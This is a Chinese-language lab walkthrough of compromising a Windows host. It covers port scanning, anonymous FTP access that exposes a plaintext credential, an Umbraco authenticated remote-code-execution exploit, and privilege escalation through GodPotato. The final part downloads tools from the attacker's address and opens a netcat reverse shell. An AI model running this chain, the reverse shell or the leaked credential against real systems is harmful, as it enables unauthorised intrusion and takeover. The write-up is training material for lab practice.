针对246进行目标端口扫描

```
sudo nmap -p- -Pn -vvv --min-rate 10000 192.168.165.247
```

![image-20250104152143923](https://s2.loli.net/2025/01/04/94eYoIwuN8Oa3ch.png)

```
sudo nmap -p80,135,139,443,445,3389,5985,14020,14080,47001 -A --min-rate 10000 192.168.165.247 -oN 192_168_165_247.txt
```

![image-20250104152327783](https://s2.loli.net/2025/01/04/Kztc7XkvPCHElnZ.png)

```
netexec smb 192.168.165.247 -u guest -p '' --shares
```

![image-20250104154157304](https://s2.loli.net/2025/01/04/5Os8rRBpF9E21hg.png)

```
dirsearch -u http://192.168.165.247
```

14020存在一个匿名访问的ftp端口，我们进行访问尝试

```
ftp 192.168.165.247 14020
binary(开启二进制传输)
```

![image-20250104174005466](https://s2.loli.net/2025/01/04/LXEIjwhFygZx8ic.png)

![image-20250104175202274](https://s2.loli.net/2025/01/04/SlrBwkTRFc5E8G6.png)

显示我们可以使用mark和pass进行登录

username：mark@relia.com

password：OathDeeplyReprieve91

```
searchsploit umbraco
searchsploit -m 49488.py
```

![image-20250104174350948](https://s2.loli.net/2025/01/04/FVd3PcKuUTbpo16.png)

```
Installing Umbraco 7
• For Umbraco 7 the requirements are
o IIS 7 or higher
Database, one of the following: SQL CE, SQL Server 2008 or higher or MySQL with support
for case insensitive queries)
•
ASP.NET 4.5 or 4.5.1. Full-Trust•
• Ability to set file/folder permissions for the user that "owns" the Application Pool
• You can use the user account "mark" (@relia.com) for basic configuration of the Umbraco
instances on IIS servers (pass "OathDeeplyReprieve91").
o Please DO NOT share this password with anyone outside the dev team.
• IIS is configured to only allow access to Umbraco using the server FQDN at the moment.
o e.g. web02.relia.com, not just web02
```

编辑下hosts文件

```
192.168.165.246 web02.relia.com
```

```
python3 49488.py -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -i http://web02.relia.com/ -c whoami
```

![image-20250104175637415](https://s2.loli.net/2025/01/04/OztxGdXPN6uK7qi.png)

出现报错，怀疑该服务不在80端口上，我们针对剩余的http端口进行尝试

```
python3 49488.py -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -i http://web02.relia.com:14080/ -c whoami
```

![image-20250104175807230](https://s2.loli.net/2025/01/04/Eh8zeQC9KIDHTpO.png)

成功，我们尝试返回一个shell

```
sudo .venv/bin/python hoaxshell.py -s 192.168.45.207 --port 443
python3 49488.py -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -i http://web02.relia.com:14080/ -c "powershell -e "
```

![image-20250104180108120](https://s2.loli.net/2025/01/04/ZUpgtQA7qzTCylJ.png)

我们更换一种方法

```
python3 49488.py -u 'mark@relia.com' -p 'OathDeeplyReprieve91' -i http://web02.relia.com:14080/ -c powershell -a " -e "
```

![image-20250104180924642](https://s2.loli.net/2025/01/04/zal5P2uFcvfKN8q.png)

这个用户属于特殊用户，Microsoft的虚拟用户

![image-20250104181017584](https://s2.loli.net/2025/01/04/UnNIikqpABlGQMv.png)

SeImpersonatePrivilege是开启状态，我们进行下提权

```
iwr http://192.168.45.207/GodPotato-NET4.exe -outfile GodPotato.exe
iwr http://192.168.45.207/ConPtyShell.exe -outfile ConPtyShell.exe
iwr http://192.168.45.207/nc.exe -outfile nc.exe
.\GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe 192.168.45.207 14020 -e cmd"

```

![image-20250104182038806](https://s2.loli.net/2025/01/04/GxFhNWVtrKS8gDc.png)
